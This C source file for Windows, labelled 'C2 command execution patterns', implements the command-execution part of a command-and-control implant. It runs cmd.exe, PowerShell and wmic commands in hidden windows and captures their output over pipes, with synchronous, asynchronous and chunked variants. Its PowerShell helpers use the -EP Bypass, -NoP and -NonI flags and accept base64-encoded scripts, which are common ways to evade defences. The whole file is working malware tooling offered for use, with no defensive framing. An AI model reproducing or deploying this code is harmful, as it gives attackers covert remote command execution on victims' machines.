/*
 * Output Capture - Pipe-based stdout/stderr capture
 * C2 command execution patterns
 */

#include <windows.h>

// ============================================================================
// CAPTURE CONTEXT
// ============================================================================

#pragma pack(push,1)
typedef struct {
    HANDLE hR;
    HANDLE hW;
    BYTE*  buf;
    DWORD  bufsz;
    DWORD  len;
} CAP_CTX;
#pragma pack(pop)

// ============================================================================
// BASIC CAPTURE
// ============================================================================

BOOL cap_init(CAP_CTX* c, DWORD sz)
{
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};

    if(!CreatePipe(&c->hR, &c->hW, &sa, 0))
        return 0;

    SetHandleInformation(c->hR, 1, 0);

    c->buf = HeapAlloc(GetProcessHeap(), 0, sz);
    c->bufsz = sz;
    c->len = 0;
    return 1;
}

void cap_close_write(CAP_CTX* c)
{
    CloseHandle(c->hW);
    c->hW = 0;
}

DWORD cap_read(CAP_CTX* c)
{
    DWORD rd, total = 0;

    while(ReadFile(c->hR, c->buf + total, c->bufsz - total - 1, &rd, 0) && rd) {
        total += rd;
        if(total >= c->bufsz - 1) break;
    }

    c->buf[total] = 0;
    c->len = total;
    return total;
}

void cap_free(CAP_CTX* c)
{
    if(c->hR) CloseHandle(c->hR);
    if(c->hW) CloseHandle(c->hW);
    if(c->buf) HeapFree(GetProcessHeap(), 0, c->buf);
}

// ============================================================================
// EXECUTE WITH CAPTURE
// ============================================================================

DWORD exec_cap(char* cmd, BYTE** out, DWORD* len, DWORD timeout)
{
    CAP_CTX c = {0};
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {sizeof(si)};
    DWORD exitcode = -1;

    if(!cap_init(&c, 0x100000))
        return -1;

    si.dwFlags = 0x100 | 1;  // USESTDHANDLES | USESHOWWINDOW
    si.hStdOutput = c.hW;
    si.hStdError = c.hW;
    si.hStdInput = 0;
    si.wShowWindow = 0;

    char cmdline[1024];
    wsprintfA(cmdline, "cmd.exe /c %s", cmd);

    if(!CreateProcessA(0, cmdline, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
        cap_free(&c);
        return GetLastError();
    }

    cap_close_write(&c);
    *len = cap_read(&c);

    if(WaitForSingleObject(pi.hProcess, timeout) == 0x102)  // WAIT_TIMEOUT
        TerminateProcess(pi.hProcess, 1);

    GetExitCodeProcess(pi.hProcess, &exitcode);

    *out = HeapAlloc(GetProcessHeap(), 0, *len + 1);
    for(DWORD i = 0; i < *len; i++)
        (*out)[i] = c.buf[i];
    (*out)[*len] = 0;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    cap_free(&c);

    return exitcode;
}

// ============================================================================
// POWERSHELL CAPTURE
// ============================================================================

DWORD ps_exec(char* script, BYTE** out, DWORD* len)
{
    char cmd[4096];
    wsprintfA(cmd, "powershell.exe -NoP -NonI -EP Bypass -C \"%s\"", script);
    return exec_cap(cmd, out, len, 60000);
}

DWORD ps_exec_b64(BYTE* b64, DWORD b64len, BYTE** out, DWORD* len)
{
    char cmd[4096];
    wsprintfA(cmd, "powershell.exe -NoP -NonI -EP Bypass -Enc %.*s", b64len, b64);
    return exec_cap(cmd, out, len, 60000);
}

// ============================================================================
// ASYNC CAPTURE
// ============================================================================

#pragma pack(push,1)
typedef struct {
    HANDLE hProcess;
    HANDLE hRead;
    HANDLE hThread;
    BYTE*  buf;
    DWORD  bufsz;
    DWORD  len;
    BOOL   done;
    CRITICAL_SECTION cs;
} ASYNC_CTX;
#pragma pack(pop)

DWORD WINAPI async_reader(LPVOID p)
{
    ASYNC_CTX* a = (ASYNC_CTX*)p;
    DWORD rd;

    while(!a->done) {
        if(ReadFile(a->hRead, a->buf + a->len, a->bufsz - a->len - 1, &rd, 0) && rd) {
            EnterCriticalSection(&a->cs);
            a->len += rd;
            a->buf[a->len] = 0;
            LeaveCriticalSection(&a->cs);
        } else {
            break;
        }
    }
    return 0;
}

BOOL async_start(char* cmd, ASYNC_CTX* a)
{
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
    HANDLE hW;

    if(!CreatePipe(&a->hRead, &hW, &sa, 0))
        return 0;

    SetHandleInformation(a->hRead, 1, 0);

    a->buf = HeapAlloc(GetProcessHeap(), 0, 0x100000);
    a->bufsz = 0x100000;
    a->len = 0;
    a->done = 0;
    InitializeCriticalSection(&a->cs);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = 0x100 | 1;
    si.hStdOutput = hW;
    si.hStdError = hW;
    si.wShowWindow = 0;

    char cmdline[1024];
    wsprintfA(cmdline, "cmd.exe /c %s", cmd);

    if(!CreateProcessA(0, cmdline, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
        CloseHandle(a->hRead);
        CloseHandle(hW);
        HeapFree(GetProcessHeap(), 0, a->buf);
        return 0;
    }

    CloseHandle(hW);
    a->hProcess = pi.hProcess;
    CloseHandle(pi.hThread);

    a->hThread = CreateThread(0, 0, async_reader, a, 0, 0);
    return 1;
}

DWORD async_poll(ASYNC_CTX* a, BYTE** data, DWORD* len)
{
    EnterCriticalSection(&a->cs);
    *len = a->len;
    *data = a->buf;
    LeaveCriticalSection(&a->cs);

    if(WaitForSingleObject(a->hProcess, 0) == 0) {
        DWORD exitcode;
        GetExitCodeProcess(a->hProcess, &exitcode);
        return exitcode;
    }

    return 0x103;  // STILL_ACTIVE
}

void async_stop(ASYNC_CTX* a)
{
    a->done = 1;
    TerminateProcess(a->hProcess, 1);
    WaitForSingleObject(a->hThread, 1000);
    CloseHandle(a->hThread);
    CloseHandle(a->hProcess);
    CloseHandle(a->hRead);
    DeleteCriticalSection(&a->cs);
    HeapFree(GetProcessHeap(), 0, a->buf);
}

// ============================================================================
// CHUNKED OUTPUT - Callback-based
// ============================================================================

typedef BOOL (*OUTPUT_CB)(BYTE*, DWORD, void*);

DWORD exec_chunked(char* cmd, OUTPUT_CB cb, void* ctx)
{
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
    HANDLE hR, hW;

    if(!CreatePipe(&hR, &hW, &sa, 0))
        return -1;

    SetHandleInformation(hR, 1, 0);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = 0x100 | 1;
    si.hStdOutput = hW;
    si.hStdError = hW;
    si.wShowWindow = 0;

    char cmdline[1024];
    wsprintfA(cmdline, "cmd.exe /c %s", cmd);

    if(!CreateProcessA(0, cmdline, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
        CloseHandle(hR);
        CloseHandle(hW);
        return GetLastError();
    }

    CloseHandle(hW);

    BYTE chunk[4096];
    DWORD rd;

    while(ReadFile(hR, chunk, sizeof(chunk), &rd, 0) && rd) {
        if(!cb(chunk, rd, ctx)) {
            TerminateProcess(pi.hProcess, 1);
            break;
        }
    }

    WaitForSingleObject(pi.hProcess, 5000);

    DWORD exitcode;
    GetExitCodeProcess(pi.hProcess, &exitcode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hR);

    return exitcode;
}

// ============================================================================
// DIRECT EXEC - No cmd.exe wrapper
// ============================================================================

DWORD exec_direct(char* path, char* args, BYTE** out, DWORD* len)
{
    CAP_CTX c = {0};
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {sizeof(si)};
    DWORD exitcode = -1;

    if(!cap_init(&c, 0x100000))
        return -1;

    si.dwFlags = 0x100 | 1;
    si.hStdOutput = c.hW;
    si.hStdError = c.hW;
    si.wShowWindow = 0;

    char cmdline[2048];
    if(args)
        wsprintfA(cmdline, "\"%s\" %s", path, args);
    else
        wsprintfA(cmdline, "\"%s\"", path);

    if(!CreateProcessA(0, cmdline, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
        cap_free(&c);
        return GetLastError();
    }

    cap_close_write(&c);
    *len = cap_read(&c);

    WaitForSingleObject(pi.hProcess, 30000);
    GetExitCodeProcess(pi.hProcess, &exitcode);

    *out = HeapAlloc(GetProcessHeap(), 0, *len + 1);
    for(DWORD i = 0; i < *len; i++)
        (*out)[i] = c.buf[i];
    (*out)[*len] = 0;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    cap_free(&c);

    return exitcode;
}

// ============================================================================
// WMIC EXEC
// ============================================================================

DWORD wmic_exec(char* query, BYTE** out, DWORD* len)
{
    char cmd[1024];
    wsprintfA(cmd, "wmic %s", query);
    return exec_cap(cmd, out, len, 30000);
}

// ============================================================================
// EOF
// ============================================================================
